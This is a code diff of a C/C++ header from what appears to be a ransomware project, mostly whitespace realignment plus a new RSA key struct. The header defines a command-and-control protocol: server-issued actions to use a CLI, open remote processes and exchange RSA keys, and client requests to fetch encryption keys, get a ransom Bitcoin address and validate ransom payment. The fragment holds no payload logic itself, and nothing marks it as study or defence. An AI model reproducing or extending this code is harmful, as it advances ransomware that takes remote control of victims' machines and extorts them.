@@ -14,13 +14,13 @@ enum ClientResponseCode {
 // Enums dictating which action to perform on the client
 // Sent from the server to client
 enum RemoteAction {
-    NONE                  = -1,
-    USE_CLI               = 0x832182,
-    OPEN_REMOTE_PROCESS   = 0x317238,
-    KILL_CLIENT           = 0x821921, // forcefully disconnect the client
-    PING_CLIENT           = 0x94932,
-    SEND_PUBLIC_RSA_KEY = 0x392191,
-    RETURN_PUBLIC_RSA_KEY = 0x403920, // respond to a request that asked for a public rsa key
+    NONE                   = -1,
+    USE_CLI                = 0x832182,
+    OPEN_REMOTE_PROCESS    = 0x317238,
+    KILL_CLIENT            = 0x821921, // forcefully disconnect the client
+    PING_CLIENT            = 0x94932,
+    SEND_PUBLIC_RSA_KEY    = 0x392191,
+    RETURN_PUBLIC_RSA_KEY  = 0x403920, // respond to a request that asked for a public rsa key
     RETURN_PRIVATE_RSA_KEY = 0x94811,
 };
 
@@ -83,7 +83,7 @@ struct ProcessInformation {
 
 // Command sent to the client from the server
 typedef struct {
-    bool              valid;
+    bool               valid;
 
     /*
         'pi' is information about a process the server
@@ -127,8 +127,8 @@ typedef struct {
 // A response from the udp server to the udp client
 // contains information about the tcp server
 typedef struct {
-    Server  TCPServer; // Info about the tcp server so the client can connect to it
-    BOOL               isValid;
+    Server      TCPServer; // Info about the tcp server so the client can connect to it
+    BOOL        isValid;
 } UDPResponse, UDPMessage;
 
 /*
@@ -136,13 +136,13 @@ typedef struct {
 */
 typedef struct {
     enum Action {
-        NONE = 0x000000,
-        CONNECT_CLIENT = 0x100000,
-        REQUEST_PUBLIC_ENCRYPTION_KEY = 0x200000,
+        NONE                           = 0x000000,
+        CONNECT_CLIENT                 = 0x100000,
+        REQUEST_PUBLIC_ENCRYPTION_KEY  = 0x200000,
         REQUEST_PRIVATE_ENCRYPTION_KEY = 0x92321,
-        VALIDATE_RANSOM_PAYMENT = 0x300000,
-        REQUEST_RANSOM_BTC_ADDRESS = 0x400000,
-        PING = 0x500000,
+        VALIDATE_RANSOM_PAYMENT        = 0x300000,
+        REQUEST_RANSOM_BTC_ADDRESS     = 0x400000,
+        PING                           = 0x500000,
     };
 
     BOOL              valid;
@@ -151,5 +151,11 @@ typedef struct {
     SOCKET            tcp;
     std::string       temp;
 } ClientRequest, ClientMessage;
+
+struct RSAKeys
+{
+    BIO* publicKey;
+    BIO* privateKey;
+};
 
 #endif
